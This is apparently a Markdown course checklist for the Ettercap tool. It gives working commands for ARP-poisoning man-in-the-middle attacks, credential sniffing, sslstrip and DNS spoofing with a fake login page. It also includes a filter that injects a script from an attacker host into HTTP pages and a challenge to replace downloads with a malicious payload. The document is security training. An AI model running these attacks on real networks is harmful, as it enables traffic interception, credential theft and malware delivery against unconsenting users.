# 🌿 Ettercap: Complete Mastery Checklist

> **What is Ettercap?** Ettercap is a comprehensive MITM framework for LAN attacks — ARP poisoning, DNS spoofing, passive traffic analysis, and credential sniffing — with a GUI and plugin system. It was the original go-to MITM tool before Bettercap superseded it. Understanding Ettercap remains valuable because many tutorials, courses, and older documentation reference it, and it is still present in most security lab environments.
>
> **When to use it:** Lab environments and courses that reference Ettercap specifically. When Bettercap is unavailable. Understanding legacy MITM tool references.
>
> **Compared to Bettercap:** Bettercap is the modern, actively maintained successor. Use Bettercap for new work. Learn Ettercap for breadth and legacy familiarity.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 4 | 1–2 hours |
| 2 | ARP Poisoning | 4 | 2–3 hours |
| 3 | Sniffing and Capture | 3 | 1–2 hours |
| 4 | Plugins | 3 | 1–2 hours |
| 5 | DNS Spoofing | 3 | 1–2 hours |
| 6 | Filters | 3 | 2–3 hours |
| 7 | Practical Labs | 3 | 2–4 hours |
| 8 | Mastery Challenges | 2 | 1–2 hours |
| | **Total** | **25** | **~11–20 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — Ettercap vs. Bettercap

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Ettercap** | Older. C-based. GUI (GTK) + text UI. Plugin system. Less actively maintained. Struggled with modern HTTPS. |
| **Bettercap** | Modern. Go-based. Web UI + interactive CLI. Modular. Actively maintained. Better HTTPS MITM. Wi-Fi support. |
| **Why Learn Ettercap** | Industry courses (CEH, OSCP older materials). Lab environments. Understanding legacy tool references. Ettercap filters have unique capabilities. |

---

### Task 1.2 — Installation

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Kali** | Pre-installed. `ettercap --version`. |
| **Install** | `apt install ettercap-text-only` (no GUI) or `ettercap-graphical` (GTK GUI). |

---

### Task 1.3 — Interfaces

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **GTK GUI** | `sudo ettercap -G` — graphical interface. |
| **Text UI** | `sudo ettercap -T` — ncurses text interface. |
| **Daemonized** | `sudo ettercap -D` — run as daemon. |
| **Quiet** | `sudo ettercap -q` — quiet mode (no interactive prompts, use with -T). |

---

### Task 1.4 — IP Forwarding

- [ ] **Completed** · ⭐ Beginner · ⏱️ 5 min

| Field | Detail |
|:---|:---|
| **Enable** | `sudo sysctl -w net.ipv4.ip_forward=1`. Required before ARP poisoning or traffic will drop. |

---

# PHASE 2: ARP POISONING

---

### Task 2.1 — GUI ARP Poisoning

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Steps** | `ettercap -G` → Sniff → Unified sniffing → Select interface. Hosts → Scan for Hosts. Hosts → Host list. Select victim → Add to Target 1. Select gateway → Add to Target 2. Mitm → ARP Poisoning → check "Sniff remote connections". Start Sniff. |

---

### Task 2.2 — CLI ARP Poisoning

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim_ip// /gateway_ip//`. |
| **Format** | `-M arp:remote /target1// /target2//` — poison both (bidirectional). |
| **Log** | `-w capture.pcap` — write captured packets. `-L logfile` — Ettercap log file. |

---

### Task 2.3 — Scan Hosts

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **CLI** | `sudo ettercap -T -i eth0 -P arp_scan` — ARP scan plugin. Lists all hosts. |
| **GUI** | Hosts → Scan for Hosts → Host List. |

---

### Task 2.4 — Stop Poisoning and Restore

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Stop** | Ctrl+C (text mode). Mitm → Stop MITM (GUI). |
| **Restore** | Ettercap sends correct ARP replies to restore tables when stopped. Always stop cleanly. |

---

# PHASE 3: SNIFFING AND CAPTURE

---

### Task 3.1 — Credential Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Automatic** | Ettercap automatically parses and displays credentials from: HTTP, FTP, Telnet, IMAP, POP3, SMTP. Shows in terminal: `[HTTP] username:password`. |
| **Save** | `-L /path/to/logfile` — save captured data. |

---

### Task 3.2 — PCAP Capture

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -w capture.pcap`. |
| **Analyze** | Open in Wireshark for detailed analysis. |

---

### Task 3.3 — Passive Sniffing (No ARP)

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo ettercap -T -i eth0` — passive only, no MITM. Sniffs traffic that naturally passes through the interface (only effective on hubs or mirrored ports — not on modern switches). |

---

# PHASE 4: PLUGINS

---

### Task 4.1 — Plugin System

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **List** | `ettercap -P list` — list all available plugins. |
| **Key Plugins** | `arp_scan`: scan network for hosts. `dns_spoof`: DNS spoofing (requires `/etc/ettercap/etter.dns` configuration). `sslstrip`: HTTPS downgrade. `search_promisc`: detect promiscuous mode NICs (find other sniffers). `repoison_arp`: re-poison more aggressively. |
| **Run** | `-P plugin_name` on command line, or Plugins → Manage Plugins in GUI. |

---

### Task 4.2 — arp_scan Plugin

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo ettercap -T -i eth0 -P arp_scan`. |
| **Output** | Lists all active hosts: IP and MAC. |

---

### Task 4.3 — sslstrip Plugin

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Use** | Combined with ARP MITM. Downgrades HTTPS → HTTP. Works on non-HSTS sites. |
| **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -P sslstrip`. |
| **Limitation** | HSTS and modern browsers make this largely ineffective against major sites. |

---

# PHASE 5: DNS SPOOFING

---

### Task 5.1 — Configure etter.dns

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **File** | `/etc/ettercap/etter.dns`. |
| **Entry** | `*.target.com A 192.168.1.50` — spoof all subdomains of target.com to attacker's IP. `target.com A 192.168.1.50`. `www.target.com A 192.168.1.50`. |
| **PTR** | `192.168.1.50 PTR attacker.com` — reverse DNS spoof. |

---

### Task 5.2 — Run DNS Spoof

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `sudo ettercap -T -i eth0 -M arp:remote /victim// /gateway// -P dns_spoof`. |
| **Verify** | On victim: `nslookup target.com` → returns attacker's IP. |

---

### Task 5.3 — Phishing with DNS Spoof

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Workflow** | Configure etter.dns. Start Apache2/Python HTTP server on attacker with fake login page. DNS spoof → victim's browser resolves to attacker → fake page served → credentials captured. |

---

# PHASE 6: FILTERS

---

### Task 6.1 — Ettercap Filter System

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Filters** | Ettercap can modify packets in transit using a filter language. Write filter → compile → apply during MITM. |
| **Language** | C-like syntax. `if (ip.proto == TCP && tcp.dst == 80) { replace("original", "modified"); }`. |
| **Compile** | `etterfilter filter.ef -o filter.ef.bin`. |
| **Apply** | `sudo ettercap -T -F filter.ef.bin -M arp:remote ...`. |

---

### Task 6.2 — Content Injection Filter

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Goal** | Inject JavaScript into HTTP responses for all browsed pages. |
| **Filter** | `if (ip.proto == TCP && tcp.dst == 80 && search(DATA.data, "Content-Type: text/html")) { replace("</head>", "<script src='http://attacker/hook.js'></script></head>"); }`. |
| **Use** | BeEF hook injection. Credential capture. Keylogging. |

---

### Task 6.3 — Kill Filter

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Drop Packets** | `if (ip.dst == "8.8.8.8") { kill(); }` — drop all DNS traffic to Google DNS (forces client to use other DNS or fail). |
| **Use** | DoS specific connections. Block specific sites. Redirect DNS. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — ARP MITM and Credential Capture

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| **Scenario** | Lab: Kali, victim VM, gateway. Enable IP forwarding. ARP poison victim. Victim accesses HTTP site or FTP. Capture credentials in Ettercap output. |
| **Success Criteria** | Credentials captured. ARP poisoning confirmed. |

---

### Lab 7.2 — DNS Spoofing

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Configure etter.dns. ARP poison victim. DNS spoof target domain. Serve fake page. Victim submits credentials to attacker's server. |
| **Success Criteria** | Victim's browser resolves domain to attacker's IP. Credentials captured. |

---

### Lab 7.3 — Content Injection Filter

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Write, compile, and apply an Ettercap filter that injects a script tag into all HTTP responses. Verify injection on victim's browser. |
| **Success Criteria** | Filter compiled without errors. Script successfully injected. Verified in victim's browser. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Ettercap vs. Bettercap Comparison

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 30 min

| **Scenario** | Perform the same ARP poisoning + credential capture with both Ettercap and Bettercap. Compare: ease of use, captured credentials, stability. Write a clear comparison with a recommendation. |
| **Success Criteria** | Both performed. Comparison documented. Clear recommendation written. |

---

### Challenge 8.2 — Custom Filter Lab

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Write a custom Ettercap filter that modifies HTTP download responses — replace a benign file's content with a malicious payload. Verify the modification reaches the victim. |
| **Success Criteria** | Filter modifies file download. Victim receives modified file. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can run Ettercap ARP poisoning via CLI and GUI | ☐ |
| Can capture credentials from cleartext protocols | ☐ |
| Can configure and run DNS spoofing with etter.dns | ☐ |
| Can compile and apply Ettercap content injection filters | ☐ |
| Can use the arp_scan and sslstrip plugins | ☐ |
| Understands the difference between Ettercap and Bettercap | ☐ |

---

## 🎯 Interview Questions

1. What is the difference between Ettercap and Bettercap?
2. How do you perform ARP poisoning with Ettercap from the command line?
3. How do you configure DNS spoofing in Ettercap?
4. How do Ettercap filters work and what can they do?
5. Why is sslstrip less effective on modern networks?
